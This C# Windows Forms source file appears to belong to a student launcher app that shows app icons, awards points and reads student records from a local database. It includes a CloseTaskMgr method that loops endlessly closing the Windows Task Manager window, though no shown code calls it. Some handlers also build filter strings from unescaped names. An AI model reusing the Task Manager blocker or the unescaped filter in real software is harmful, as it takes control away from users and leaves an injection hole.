using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;

namespace Tallus3.Launch
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern bool CloseWindow(IntPtr hwnd);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpclass, string lpname);
 
        bool drag;
        int x, y;



        Apps.Emails.EmailClient ToyStory;
        Launch.Emails.EmailClient2 ToyStory2;
        Apps.help up;
        Apps.Books.Books1 Jaws;
        Apps.Twitter Redeye;
        Apps.Achievements MegaMind;
        Apps.Musicplayer StepUp;
        Apps.maths SpiderMan;
        Apps.Notes SawVI;
        Apps.Amazon KickAss;
        Apps.Internett DarkKnight;
        Login ToyStory3;

        Apps.Xbox Superbad;
        public Form1()
        {
            InitializeComponent();
            pictureBox1.MouseEnter += new EventHandler(pictureBox1_MouseEnter);
            pictureBox6.MouseEnter += new EventHandler(pictureBox6_MouseEnter);
            pictureBox7.MouseEnter += new EventHandler(pictureBox7_MouseEnter);
            pictureBox7.MouseLeave += new EventHandler(pictureBox7_MouseLeave);
            pictureBox8.MouseEnter += new EventHandler(pictureBox8_MouseEnter);
            pictureBox8.MouseLeave += new EventHandler(pictureBox8_MouseLeave);
            this.Load += new EventHandler(Form1_Load);
            this.panel6.MouseUp += new System.Windows.Forms.MouseEventHandler(this.MouseisUp);
            this.panel6.MouseMove += new System.Windows.Forms.MouseEventHandler(this.MouseMoves);
            this.panel6.MouseDown += new System.Windows.Forms.MouseEventHandler(this.MouseisDown);
        }
    
          public void MouseisDown(object sender, System.Windows.Forms.MouseEventArgs e)
  {
        if(e.Button == MouseButtons.Left)
        {
    drag = true;
    x = e.X;
    y = e.Y;
        }
        
  }
  
      public void MouseisUp(object sender, System.Windows.Forms.MouseEventArgs e)
  {
        drag = false;
        
  }  
      
      public void MouseMoves(object sender, System.Windows.Forms.MouseEventArgs e)
  {
        if(drag)
        {
            this.panel6.Location = new Point(e.X + this.panel6.Left - x, e.Y + this.panel6.Top - y);
        }
  }
        private void icons_ControlBindingNavigatorSaveItem_Click(object sender, EventArgs e)
        {
            this.Validate();
            this.icons_ControlBindingSource.EndEdit();

            this.studentsinformationBindingSource.EndEdit(); this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);
        }
    public static void CloseTaskMgr()
        {
            for (; ; )
            {
               IntPtr hwndtskm = FindWindow(null, "Windows Task Manager");
               CloseWindow(hwndtskm);
 
            }
        } 
  
        private void Form1_Load(object sender, EventArgs e)
        {
           // TODO: This line of code loads data into the 'tallusDatabaseDataSet.Icons_Control' table. You can move, or remove it, as needed.
            this.icons_ControlTableAdapter.Fill(this.tallusDatabaseDataSet.Icons_Control);
            // TODO: This line of code loads data into the 'tallusDatabaseDataSet.Studentsinformation' table. You can move, or remove it, as needed.
            this.studentsinformationTableAdapter.Fill(this.tallusDatabaseDataSet.Studentsinformation);
            // TODO: This line of code loads data into the 'tallusDatabaseDataSet.Studentsinformation' table. You can move, or remove it, as needed.
            this.studentsinformationTableAdapter.Fill(this.tallusDatabaseDataSet.Studentsinformation);
            // TODO: This line of code loads data into the 'tallusDatabaseDataSet.Icons_Control' table. You can move, or remove it, as needed.
            this.icons_ControlTableAdapter.Fill(this.tallusDatabaseDataSet.Icons_Control);



            Rectangle g = new Rectangle(0, 0, panel5.Width, panel5.Height);
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            int w = 20;
            gp.AddArc(g.X, g.Y, w, w, 180, 90);
            gp.AddArc(g.X + g.Width - w, g.Y, w, w, 270, 90);
            gp.AddArc(g.X + g.Width - w, g.Y + g.Height - w, w, w, 0, 90);
            gp.AddArc(g.X, g.Y + g.Height - w, w, w, 90, 90);
            panel5.Region = new Region(gp);

            Label14.Text = Properties.Settings.Default.StudentNamefirst;
            Label13.Text = Properties.Settings.Default.StudentNamefirst;
            label22.Text = Properties.Settings.Default.StudentNamefirst;
            Label16.Text = pointsTextBox.Text;
            Label18.Text = pointsTextBox.Text;


            email.Left = (panel9.Width - email.Width) / 2;
            email.Top = (panel9.Height - email.Height) / 2;
            calculator.Left = (panel10.Width - calculator.Width) / 2;
            calculator.Top = (panel10.Height - calculator.Height) / 2;
            musicplayer.Left = (panel10.Width - musicplayer.Width) / 2;
            musicplayer.Top = (panel10.Height - musicplayer.Height) / 2;


            notepadbox.Left = (panel11.Width - notepadbox.Width) / 2;
            notepadbox.Top = (panel11.Height - notepadbox.Height) / 2;
            amazon.Left = (panel11.Width - amazon.Width) / 2;
            amazon.Top = (panel11.Height - amazon.Height) / 2;


            xbox.Left = (panel15.Width - xbox.Width) / 2;
            xbox.Top = (panel15.Height - xbox.Height) / 2;
            internet4.Left = (panel15.Width - internet4.Width) / 2;
            internet4.Top = (panel15.Height - internet4.Height) / 2;


            achievements.Left = (panel17.Width - achievements.Width) / 2;
            achievements.Top = (panel17.Height - achievements.Height) / 2;
            books.Left = (panel17.Width - books.Width) / 2;
            books.Top = (panel17.Height - books.Height) / 2;

            twittert.Left = (panel18.Width - twittert.Width) / 2;
            twittert.Top = (panel18.Height - twittert.Height) / 2;

            panel19.Left = (panel9.Width - panel19.Width) / 2;
        panel19.Top = (panel9.Height - panel19.Height) / 2;
        }

        private void pointschecker_Tick(object sender, EventArgs e)
        {
            Label16.Text = pointsTextBox.Text;
            Label18.Text = pointsTextBox.Text ;
            Label19.Text = Properties.Settings.Default.unlockgood;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            panel7.Show();
        }
        private void pictureBox1_MouseEnter(object sender, System.EventArgs e)
        {
            panel7.Show();
        }
        private void pictureBox6_Click(object sender, EventArgs e)
        {
            pictureBox6.Hide();
          panel5.Show();
        }
        void pictureBox6_MouseEnter(object sender, EventArgs e)
        {
            pictureBox6.Hide();
            panel5.Show();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            float a, b, r;
            a = Convert.ToInt32(pointsTextBox.Text );
            b = Convert.ToInt32(20);
            r = a + b;
            Label16.Text = r.ToString();
            pointsTextBox.Text = r.ToString();
            Properties.Settings.Default.StudentPoints = Label16.Text;
            Properties.Settings.Default.StudentPoints = (Label16.Text);
            Properties.Settings.Default.unlockgood = "Books are super fun:) ";
            Properties.Settings.Default.scorebanner = "true";
            Properties.Settings.Default.Save();

            Label16.Text = Properties.Settings.Default.StudentPoints;


        }
        void pictureBox7_MouseLeave(object sender, EventArgs e)
        {
            this.pictureBox7.BackgroundImage = ((System.Drawing.Image)(Properties.Resources.blank1 ));
        }


        void pictureBox7_MouseEnter(object sender, EventArgs e)
        {
            this.pictureBox7.BackgroundImage = ((System.Drawing.Image)(Properties.Resources.mainheader));
        }
        void pictureBox8_MouseLeave(object sender, EventArgs e)
        {
            this.pictureBox8.BackgroundImage = ((System.Drawing.Image)(Properties.Resources.blank1));
        }


        void pictureBox8_MouseEnter(object sender, EventArgs e)
        {
            this.pictureBox8.BackgroundImage = ((System.Drawing.Image)(Properties.Resources.mainheader));
        }

        private void dateandtime_Tick(object sender, EventArgs e)
        {

            if (Properties.Settings.Default.twitter == "true")
            {

                twittert.Show();
            }







          


            if (Properties.Settings.Default.twitter == "true")
            {

                twittert.Show();
            }



            if (twittert.Visible == false)
            {

                panel7.Enabled = false;
            }

            if (twittert.Visible == true)
            {
                panel7.Enabled = true;

            }
            Label11.Text = DateTime.Now.ToString("HH:mm:ss", System.Globalization.DateTimeFormatInfo.InvariantInfo);
            Label12.Text = DateTime.Now.ToString(DateTime.Now.ToShortDateString());
        }

        private void pointschecker_Tick_1(object sender, EventArgs e)
        {
            Label18.Text = pointsTextBox.Text;
            Label16.Text = pointsTextBox.Text;
            label50.Text = Properties.Settings.Default.unlockgood;
        }

        private void loadtimer_Tick(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.books == "false")
            {
                books.Hide();

            }
            if (Properties.Settings.Default.books == "true")
            {
                books.Show();

            }

            if (Properties.Settings.Default.emails == "false")
            {
                email.Hide();

            }
            if (Properties.Settings.Default.emails == "true")
            {
                email.Show();

            }
            if (Properties.Settings.Default.internet == "false")
            {
                internet4.Hide();

            }
            if (Properties.Settings.Default.internet == "true")
            {
                internet4.Show();

            }
            if (Properties.Settings.Default.calculator == "true")
            {
                calculator.Show();

            }
            if (Properties.Settings.Default.music == "true")
            {
                musicplayer.Show();
            }
            if (Properties.Settings.Default.twitter == "true")
            {
                twittert.Show();
            }

            if (Properties.Settings.Default.xbox == "true")
            {
                xbox.Show();
            }
            if (Properties.Settings.Default.notepad == "true")
            {
                notepadbox.Show();
            }
            if (Properties.Settings.Default.Achievements == "true")
            {
                achievements.Show();
            }

            if (Properties.Settings.Default.calculator == "false")
            {
                calculator.Hide();
            }
            if (Properties.Settings.Default.music == "false")
            {
                musicplayer.Hide();
            }
            if (Properties.Settings.Default.twitter == "false")
            {
                twittert.Hide();
            }
            if (Properties.Settings.Default.xbox == "false")
            {
                xbox.Hide();
            }
            if (Properties.Settings.Default.notepad == "false")
            {
                notepadbox.Hide();
            }
            if (Properties.Settings.Default.Achievements == "false")
            {
                achievements.Hide();
            }
            loadtimer.Stop();
        }

        private void unlocktime_Tick(object sender, EventArgs e)
        {

            if (Label18.Text == "-200")
            {
                panel12.Hide();
                panel2.Hide();
                panel3.Hide();


            }

            if (Label18.Text == "120")
            {
     
                notesCheckBox.CheckState = CheckState.Checked;
            }

            if (Label18.Text == "160")
            {
                mathsCheckBox.CheckState = CheckState.Checked;
            }



            if (Label18.Text == "200")
            {
                twitterCheckBox1.CheckState = CheckState.Checked;
            }



            if (Label18.Text == "80")
            {

                notesCheckBox.CheckState = CheckState.Unchecked ;
            }

            if (Label18.Text == "140")
            {
                Properties.Settings.Default.calculator = "false";
                mathsCheckBox.CheckState = CheckState.Unchecked ;
            }



            if (Label18.Text == "180")
            {
                twitterCheckBox1.CheckState = CheckState.Unchecked ;
            }

        }

        private void Sayingbanner_Tick(object sender, EventArgs e)
        {
           
            
            
            
            
            
            
            
            
            
            if (Properties.Settings.Default.scorebanner == "true")
            {
                panel13.Show();
                panel14.Show();
                panel16.Show();
            }
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            label22.Text = Properties.Settings.Default.StudentNamefirst;
            Label14.Text = Properties.Settings.Default.StudentNamefirst;
            Label13.Text = Properties.Settings.Default.StudentNamefirst;
            string searchFor = Properties.Settings.Default.StudentNamefirst;
            int results = 0;
            DataRow[] returnedRows;



            returnedRows = tallusDatabaseDataSet.Tables["Studentsinformation"].Select("FirstName='" + searchFor + "'");
            results = returnedRows.Length;
            if (results > 0)
            {
                DataRow dr1;
                dr1 = returnedRows[0];
                Properties.Settings.Default.StudentNamefirst = (dr1["FirstName"].ToString());


                Properties.Settings.Default.StudentNameLast = (dr1["LastName"].ToString());

                Properties.Settings.Default.StudentAddress = (dr1["Address"].ToString());
                Properties.Settings.Default.StudentAge = (dr1["Age"].ToString());
                Properties.Settings.Default.StudentPoints = (dr1["Points"].ToString());
                Properties.Settings.Default.StudentClass = (dr1["Email"].ToString());


                Properties.Settings.Default.Save();
            }
            else
            {
          
            }

            Label13.Text = Properties.Settings.Default.StudentNamefirst;
            Label14.Text = Properties.Settings.Default.StudentNamefirst;
            label22.Text = Properties.Settings.Default.StudentNamefirst;
            Label15.Text = Properties.Settings.Default.StudentAge;
            label21.Text = Properties.Settings.Default.StudentClass;
          
        }

        private void loadchecker_Tick(object sender, EventArgs e)
        {

            if (books.Visible == true)
            {
                achievements.Hide();

            }

            if (internet4.Visible == true)
            {
                xbox.Hide();

            }
        }

        private void Sayingbannerhide_Tick(object sender, EventArgs e)
        {
              if (Properties.Settings.Default.scorebanner == "false")
               {
                   panel13.Hide();
                   panel14.Hide();
                   panel16.Hide();
               }
               Properties.Settings.Default.scorebanner = "false";

               checkBox1.CheckState = CheckState.Checked;
           }

        private void timer1_Tick(object sender, EventArgs e)
        {
                   this.icons_ControlTableAdapter.Fill(this.tallusDatabaseDataSet.Icons_Control);
        }

        private void timer2_Tick_1(object sender, EventArgs e)
        {
         timer4.Enabled = false;


                if (internetCheckBox.CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.internet == "true")
                {
                 internet4.Visible = true;
                }


      }
            if (internetCheckBox.CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.internet == "true")
                {
                 internet4.Visible = true;
                }
                


                if (emailCheckBox.CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.emails == "true")
                {
                email.Visible = true;
                }


      }
          if (emailCheckBox.CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.emails == "true")
                {
                email.Visible = true;
                }





     
          if (booksCheckBox.CheckState == CheckState.Indeterminate )
            {
                if (Properties.Settings.Default.books  == "true")
                {
             books.Visible = true;
                }


      }
          if (booksCheckBox.CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.books  == "true")
                {
             books.Visible = true;
                }





          if (calculatorCheckBox.CheckState == CheckState.Indeterminate )
            {
              
                if (Properties.Settings.Default.calculator   == "true")
                {
          calculator.Visible = true;
                }


      }
         if (calculatorCheckBox.CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.calculator   == "true")
                {
          calculator.Visible = true;
                }




              if (twitterCheckBox.CheckState == CheckState.Indeterminate )
            {
                if (Properties.Settings.Default.twitter    == "true")
                {
         twittert.Visible = true;
                }


      }
        
              if (twitterCheckBox.CheckState == CheckState.Unchecked  )
            {
                if (Properties.Settings.Default.twitter    == "true")
                {
         twittert.Visible = true;
                }







       if (windowsCheckBox. CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.xbox   == "true")
                {
        xbox.Visible = true;
                }


      }
        
           if (windowsCheckBox. CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.xbox   == "true")
                {
        xbox.Visible = true;
                }


                       if (amazonCheckBox. CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.amazon == "true")
                {
    amazon.Visible = true;
                }


      }
        
                if (amazonCheckBox. CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.amazon == "true")
                {
      amazon.Visible = true;
                }




                 if (achievementsCheckBox. CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.Achievements == "true")
                {
      achievements.Visible = true;
                }


      }
        
                if (achievementsCheckBox. CheckState == CheckState.Unchecked )
            {
                if (Properties.Settings.Default.Achievements == "true")
                {
      achievements.Visible = true;
                }

   if (musicCheckBox.CheckState == CheckState.Indeterminate)
            {
                if (Properties.Settings.Default.music == "true")
                {
                   musicplayer.Visible = true;
                }


            }
            if ( musicCheckBox.CheckState == CheckState.Unchecked)
            {
                if (Properties.Settings.Default.music == "true")
                {
                      musicplayer.Visible = true;
                }

            if (notepadCheckBox.CheckState == CheckState.Indeterminate)
            {






                if (Properties.Settings.Default.notepad == "true")
                {
                    notepadbox.Visible = true;
                }


            }
            if (notepadCheckBox.CheckState == CheckState.Unchecked)
            {
                if (Properties.Settings.Default.notepad == "true")
                {
                    notepadbox.Visible = true;
                }
              
          
            }
            }
 }
            }

     }
         }
 }
            }
   }
 }
        }

        private void timer5_Tick(object sender, EventArgs e)
        {

            if (set_ChangesCheckBox.CheckState == CheckState.Indeterminate)
            {
                timer11.Enabled = true;
                unlocktime.Enabled = true;
                timer2.Enabled = true;
            }
            if (set_ChangesCheckBox.CheckState == CheckState.Unchecked)
            {
                timer2.Enabled = false;
                timer11.Enabled = true;
                unlocktime.Enabled = true;
                loadtimer.Enabled = true;
            }
            if (set_ChangesCheckBox.CheckState == CheckState.Checked)
            {
                timer11.Enabled = false;
                unlocktime.Enabled = false;
                timer4.Enabled = true;
                timer2.Enabled = false;
                loadtimer.Enabled = false;
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            if (set_ChangesCheckBox.CheckState == CheckState.Checked)
            {
                timer5.Enabled = true;

            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            float a, b, r;
            a = Convert.ToInt32(label29.Text);
            b = Convert.ToInt32(20);
            r = a + b;
            label29.Text = r.ToString();
            pointsTextBox.Text = r.ToString();
            Label16.Text = r.ToString();
            Properties.Settings.Default.StudentPoints = label29.Text;
            Properties.Settings.Default.StudentPoints = (label29.Text);
            Properties.Settings.Default.unlockgood = "Books are super fun:) ";
            Properties.Settings.Default.scorebanner = "true";
            Properties.Settings.Default.Save();

            Label16.Text = Properties.Settings.Default.StudentPoints;
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);

        }

        private void icons_ControlBindingNavigator_RefreshItems(object sender, EventArgs e)
        {

        }

        private void studentsinformationBindingNavigator_RefreshItems(object sender, EventArgs e)
        {
        
        }

        private void bindingSource1_CurrentChanged(object sender, EventArgs e)
        {

        }

        private void studentsinformationBindingNavigatorSaveItem_Click(object sender, EventArgs e)
        {
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);

        }

        private void toolStripButton7_Click(object sender, EventArgs e)
        {
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
           
            string searchFor = Properties.Settings.Default.StudentNamefirst;
            int results = 0;
            DataRow[] returnedRows;



            returnedRows = tallusDatabaseDataSet.Tables["Studentsinformation"].Select("FirstName='" + searchFor + "'");
            results = returnedRows.Length;
            if (results > 0)
            {
                DataRow dr1;
                dr1 = returnedRows[0];
                label30.Text = (dr1["Student-Information"].ToString());
                label27.Text = (dr1["FirstName"].ToString());
                label28.Text = (dr1["LastName"].ToString());
                Properties.Settings.Default.StudentPoints = (dr1["Points"].ToString());
                label29.Text = Properties.Settings.Default.StudentPoints;
             
            }
        }

        private void toolStripButton5_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            
        }
       
        private void timer9_Tick(object sender, EventArgs e)
        {
           

        
                if (firstNameTextBox.Text == label27.Text)
                {
                    timer9.Enabled = false;

                    timer9.Stop();
                }
                this.studentsinformationBindingSource.MoveNext();

                if (timer9.Enabled == false)
                {
                    this.studentsinformationBindingSource.MovePrevious();
                }
            }

        private void pictureBox18_Click(object sender, EventArgs e)
        {
            DarkKnight = new Apps.Internett();
            DarkKnight.Show();
        }

        private void PictureBox14_Click(object sender, EventArgs e)
        {
        SawVI = new Apps.Notes();
            SawVI.Show();
        
        }

        private void PictureBox12_Click(object sender, EventArgs e)
        {
            Superbad = new Apps.Xbox();
            Superbad.Show();
        }

        private void PictureBox13_Click(object sender, EventArgs e)
        {
            KickAss  = new Apps.Amazon ();
            KickAss.Show();
        }

        private void pictureBox17_Click(object sender, EventArgs e)
        {
            MegaMind  = new Apps.Achievements ();
            MegaMind.Show();
        }

        private void pictureBox15_Click(object sender, EventArgs e)
        {
            Jaws = new Apps.Books.Books1 ();
            Jaws.Show();
        }

        private void pictureBox16_Click(object sender, EventArgs e)
        {
            Redeye  = new Apps.Twitter ();
            Redeye.Show();
        }

        private void pictureBox9_Click(object sender, EventArgs e)
        {
           SpiderMan = new Apps.maths ();
           SpiderMan.Show();
        }

        private void pictureBox11_Click(object sender, EventArgs e)
        {
            panel19.Visible = true;
            email.Visible = false;
        }

        private void pictureBox10_Click(object sender, EventArgs e)
        {
            StepUp  = new Apps.Musicplayer ();
            StepUp.Show();
        }

        private void panel12_Paint(object sender, PaintEventArgs e)
        {

        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer2.Enabled = false;


            if (internetCheckBox.CheckState == CheckState.Checked)
            {

                internet4.Show();
            }

            if (internetCheckBox.CheckState == CheckState.Unchecked)
            {

                internet4.Hide();
            }






            if (emailCheckBox.CheckState == CheckState.Checked)
            {

                email.Show();
            }

            if (emailCheckBox.CheckState == CheckState.Unchecked)
            {

                email.Hide();
            }





            if (booksCheckBox.CheckState == CheckState.Checked)
            {

                books.Show();
            }

            if (booksCheckBox.CheckState == CheckState.Unchecked)
            {

                books.Hide();


            }




            if (calculatorCheckBox.CheckState == CheckState.Checked)
            {

                calculator.Show();
            }

            if (calculatorCheckBox.CheckState == CheckState.Unchecked)
            {

                calculator.Hide();


            }



            if (twitterCheckBox.CheckState == CheckState.Checked)
            {

                twittert.Show();
            }

            if (twitterCheckBox.CheckState == CheckState.Unchecked)
            {

                twittert.Hide();


            }



            if (musicCheckBox.CheckState == CheckState.Checked)
            {

                musicplayer.Show();
            }

            if (musicCheckBox.CheckState == CheckState.Unchecked)
            {

                musicplayer.Hide();


            }
            if (windowsCheckBox.CheckState == CheckState.Checked)
            {

                xbox.Show();
            }

            if (windowsCheckBox.CheckState == CheckState.Unchecked)
            {

                xbox.Hide();


            }

            if (achievementsCheckBox.CheckState == CheckState.Checked)
            {

                achievements.Show();
            }

            if (achievementsCheckBox.CheckState == CheckState.Unchecked)
            {

                achievements.Hide();


            }





            if (amazonCheckBox.CheckState == CheckState.Checked)
            {

                amazon.Show();
            }

            if (amazonCheckBox.CheckState == CheckState.Unchecked)
            {

                amazon.Hide();


            }



            if (notepadCheckBox.CheckState == CheckState.Checked)
            {

                notepadbox.Show();
            }

            if (notepadCheckBox.CheckState == CheckState.Unchecked)
            {
                notepadbox.Hide();
            }
            timer4.Enabled = false;
            timer4.Stop();
        }

        private void timer11_Tick(object sender, EventArgs e)
        {

           





            if (notesCheckBox.CheckState == CheckState.Checked)
            {
                timer14.Enabled = true;
                Properties.Settings.Default.notepad  = "true";
                Properties.Settings.Default.Save();
              
            }
            else
            {
                if (notesCheckBox.CheckState == CheckState.Unchecked)
                    timer14.Enabled = true;
                Properties.Settings.Default.notepad = "false";
                Properties.Settings.Default.Save();
            
            }








            if (mathsCheckBox.CheckState == CheckState.Checked)
            {
                Properties.Settings.Default.calculator = "true";
                Properties.Settings.Default.Save();

            }
            else
            {
                if (mathsCheckBox.CheckState == CheckState.Unchecked)
                Properties.Settings.Default.calculator = "false";
                Properties.Settings.Default.Save();
            }







            if (twitterCheckBox1.CheckState == CheckState.Checked)
            {
                Properties.Settings.Default.twitter = "true";
                Properties.Settings.Default.Save();

            }
            else
            {
                if (twitterCheckBox1.CheckState == CheckState.Unchecked)
                Properties.Settings.Default.twitter = "false";
                Properties.Settings.Default.Save();
            }










            if (xboxCheckBox.CheckState == CheckState.Checked)
            {
                Properties.Settings.Default.xbox = "true";
                Properties.Settings.Default.Save();

            }
            else
            {
                if (xboxCheckBox.CheckState == CheckState.Unchecked )
                Properties.Settings.Default.xbox = "false";
                Properties.Settings.Default.Save();
            }
















            if (musicCheckBox1.CheckState == CheckState.Checked)
            {
                Properties.Settings.Default.music = "true";
                Properties.Settings.Default.Save();

            }
            else
            {
                if (musicCheckBox1.CheckState == CheckState.Unchecked)
                Properties.Settings.Default.music = "false";
                Properties.Settings.Default.Save();
            }







            if (achievementsCheckBox1.CheckState == CheckState.Checked)
            {
                Properties.Settings.Default.Achievements = "true";
                Properties.Settings.Default.Save();

            }
            else
            {
                if (achievementsCheckBox1.CheckState == CheckState.Unchecked)
                Properties.Settings.Default.Achievements = "false";
                Properties.Settings.Default.Save();
            } 








        }

        private void pictureBox8_Click(object sender, EventArgs e)
        {
            loadtimer.Stop();


            timer11.Stop();
            timer12.Enabled = true;

            timer2.Stop();
            timer4.Stop();


            pictureBox16.Hide();
            Label6.Hide();
            timer1.Stop();
            internet4.Hide();
            email.Hide();
            calculator.Hide();
            musicplayer.Hide();
            books.Hide();
            twittert.Hide();
            notepadbox.Hide();




            if (Properties.Settings.Default.amazon == "true")
            {
                amazon.Show();
            }

            if (Properties.Settings.Default.xbox == "true")
            {
                xbox.Show();
            }

            if (Properties.Settings.Default.notepad == "true")
            {
                notepadbox.Visible = true;
            }

            if (Properties.Settings.Default.Achievements == "true")
            {
                achievements.Show();

            }
        }

        private void pictureBox7_Click(object sender, EventArgs e)
        {
            timer2.Stop();
            timer4.Stop();

            email.Hide();
            calculator.Hide();
            musicplayer.Hide();
            books.Hide();
            pictureBox16.Show();
            Label6.Show();
            twittert.Hide();
            internet4.Visible = true;
            email.Visible = true;
            books.Visible = true;

            if (internet4.Visible == true)
            {
                amazon.Visible = false;
            }

            if (Properties.Settings.Default.calculator == "true")
            {
                calculator.Show();
            }

            if (Properties.Settings.Default.music == "true")
            {
                musicplayer.Show();
            }

            if (Properties.Settings.Default.twitter == "true")
            {
                twittert.Visible = true;
            }

            if (Properties.Settings.Default.Achievements == "true")
            {
                achievements.Show();

            }

            if (Properties.Settings.Default.xbox == "true")
            {
                xbox.Show();
            }

            if (Properties.Settings.Default.notepad == "true")
            {
                notepadbox.Visible = true;
            }

            if (Properties.Settings.Default.Achievements == "true")
            {
                achievements.Show();

            }
        }

        private void timer12_Tick(object sender, EventArgs e)
        {
            timer11.Start();

        }

        private void Label13_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Reset();

        }

        private void pictureBox24_Click(object sender, EventArgs e)
        {
      up = new Apps.help ();
           up.Show();
        }

        private void autohide_Tick(object sender, EventArgs e)
        {
            panel7.Hide();
            pictureBox6.Show();
            panel5.Hide();
        }

        private void timer13_Tick(object sender, EventArgs e)
        {
            float a, b, r;
            a = Convert.ToInt32(label29.Text);
            b = Convert.ToInt32(20);
            r = a + b;

            pointsTextBox.Text = r.ToString();
       
            Properties.Settings.Default.StudentPoints = label29.Text;
            Properties.Settings.Default.StudentPoints = (label29.Text);
            Properties.Settings.Default.unlockgood = "20 Points For you ";
            Properties.Settings.Default.scorebanner = "true";
            Properties.Settings.Default.Save();

            Label16.Text = Properties.Settings.Default.StudentPoints;
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);
           
        }

        private void timer13_Tick_1(object sender, EventArgs e)
        {

            Properties.Settings.Default.Save();

            if (Properties.Settings.Default.points10 == "true")
            {
                points10.Enabled = true;
                points10.Start();
                Properties.Settings.Default.points10 = "false";
       
            }
            else 
            {

                if (Properties.Settings.Default.points10 == "false")
            {
                points10.Enabled = false;
                    points10.Stop();
              
        }

    if (Properties.Settings.Default.points101 == "true")
            {
                points101.Enabled = true;
                points101.Start();
                Properties.Settings.Default.points101 = "false";
       
            }
            else 
            {

                if (Properties.Settings.Default.points101 == "false")
            {
                points101.Enabled = false;
                    points101.Stop();
              
        }



            }





            }

    }


        private void pictureBox25_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Reset();
            this.Close();
          ToyStory3  = new Login ();
          ToyStory3.Show();
          

        }

        private void pictureBox20_Click(object sender, EventArgs e)
        {
            Label18.Show();

        }

        private void notesCheckBox_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void timer14_Tick(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.books == "false")
            {
                books.Hide();

            }
            if (Properties.Settings.Default.books == "true")
            {
                books.Show();

            }

            if (Properties.Settings.Default.emails == "false")
            {
                email.Hide();

            }
            if (Properties.Settings.Default.emails == "true")
            {
                email.Show();

            }
            if (Properties.Settings.Default.internet == "false")
            {
                internet4.Hide();

            }
            if (Properties.Settings.Default.internet == "true")
            {
                internet4.Show();

            }
            if (Properties.Settings.Default.calculator == "true")
            {
                calculator.Show();

            }
            if (Properties.Settings.Default.music == "true")
            {
                musicplayer.Show();
            }
            if (Properties.Settings.Default.twitter == "true")
            {
                twittert.Show();
            }

            if (Properties.Settings.Default.xbox == "true")
            {
                xbox.Show();
            }
            if (Properties.Settings.Default.notepad == "true")
            {
                notepadbox.Show();
            }
            if (Properties.Settings.Default.Achievements == "true")
            {
                achievements.Show();
            }

            if (Properties.Settings.Default.calculator == "false")
            {
                calculator.Hide();
            }
            if (Properties.Settings.Default.music == "false")
            {
                musicplayer.Hide();
            }
            if (Properties.Settings.Default.twitter == "false")
            {
                twittert.Hide();
            }
            if (Properties.Settings.Default.xbox == "false")
            {
                xbox.Hide();
            }
            if (Properties.Settings.Default.notepad == "false")
            {
                notepadbox.Hide();
            }
            if (Properties.Settings.Default.Achievements == "false")
            {
                achievements.Hide();
            }
            timer14.Enabled = false;
        }

        private void timer10_Tick(object sender, EventArgs e)
        {

        }

        private void timer15_Tick(object sender, EventArgs e)
        {
            float a, b, r;
            a = Convert.ToInt32(label29.Text);
            b = Convert.ToInt32(20);
            r = a - b;

            pointsTextBox.Text = r.ToString();

            Properties.Settings.Default.StudentPoints = label29.Text;
            Properties.Settings.Default.StudentPoints = (label29.Text);
            Properties.Settings.Default.unlockgood = "Have to take 20 points from you ";
            Properties.Settings.Default.scorebanner = "true";
            Properties.Settings.Default.Save();

            Label16.Text = Properties.Settings.Default.StudentPoints;
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);
           
        }

        private void button2_Click(object sender, EventArgs e)
        {
            float a, b, r;
            a = Convert.ToInt32(label29.Text);
            b = Convert.ToInt32(10);
            r = a - b;

            pointsTextBox.Text = r.ToString();

            Properties.Settings.Default.StudentPoints = label29.Text;
            Properties.Settings.Default.StudentPoints = (label29.Text);
            Properties.Settings.Default.unlockgood = "20 Points For you ";
            Properties.Settings.Default.scorebanner = "true";
            Properties.Settings.Default.Save();

            Label16.Text = Properties.Settings.Default.StudentPoints;
            this.Validate();
            this.studentsinformationBindingSource.EndEdit();
            this.tableAdapterManager.UpdateAll(this.tallusDatabaseDataSet);
           
        }

        private void pictureBox27_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("osk");
         
        }

        private void timer15_Tick_1(object sender, EventArgs e)
        {
         

    }

